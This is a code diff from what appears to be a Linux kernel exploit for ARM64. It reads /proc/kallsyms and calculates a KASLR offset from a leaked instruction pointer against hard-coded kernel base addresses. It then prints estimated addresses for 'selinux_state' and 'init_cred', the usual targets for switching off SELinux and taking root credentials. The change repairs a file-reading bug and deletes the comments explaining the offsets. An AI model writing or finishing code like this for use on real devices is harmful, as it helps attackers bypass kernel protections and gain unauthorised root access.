@@ -219,9 +219,15 @@ void read_kallsyms_if_possible(void) {
         return;
     }
     printf("  /proc/kallsyms: readable (kptr_restrict=0 or relaxed)\n");
+    FILE *fp = fdopen(fd, "r");
+    if (!fp) {
+        printf("  fdopen failed\n");
+        close(fd);
+        return;
+    }
     char line[512];
     int found_selinux = 0, found_init = 0;
-    while (fgets(line, sizeof(line), fd)) {
+    while (fgets(line, sizeof(line), fp)) {
         char sym[128], type;
         unsigned long long addr;
         if (sscanf(line, "%llx %c %127s", &addr, &type, sym) == 3) {
@@ -235,7 +241,7 @@ void read_kallsyms_if_possible(void) {
             }
         }
     }
-    close(fd);
+    fclose(fp);
     if (!found_selinux) printf("  selinux_state not found in kallsyms\n");
     if (!found_init) printf("  init_cred not found in kallsyms\n");
 }
@@ -271,17 +277,17 @@ uint64_t compute_address_with_base(uint64_t ip, uint64_t base) {
 
 void try_known_bases(uint64_t ip) {
     uint64_t bases[] = {
-        0xffffffee85a81000ULL,  // _stext from given kallsyms
-        0xffffffc010080000ULL,  // common ARM64 base
-        0xffffffff81000000ULL,  // x86_64 common (but this is ARM?)
+        0xffffffee85a81000ULL,
+        0xffffffc010080000ULL,
+        0xffffffff81000000ULL,
         0
     };
     for (int i = 0; bases[i]; i++) {
         uint64_t kaslr = compute_address_with_base(ip, bases[i]);
-        if (kaslr < 0x1000000) { // plausible KASLR offset
+        if (kaslr < 0x1000000) {
             printf("  Plausible KASLR offset: 0x%lx (base=0x%lx)\n", kaslr, bases[i]);
-            uint64_t selinux = bases[i] + 0x28B9000ULL; // offset from _stext
-            uint64_t init_cred = bases[i] + 0x26FA738ULL; // offset from _stext
+            uint64_t selinux = bases[i] + 0x28B9000ULL;
+            uint64_t init_cred = bases[i] + 0x26FA738ULL;
             printf("  Estimated selinux_state = 0x%lx\n", selinux);
             printf("  Estimated init_cred = 0x%lx\n", init_cred);
         }
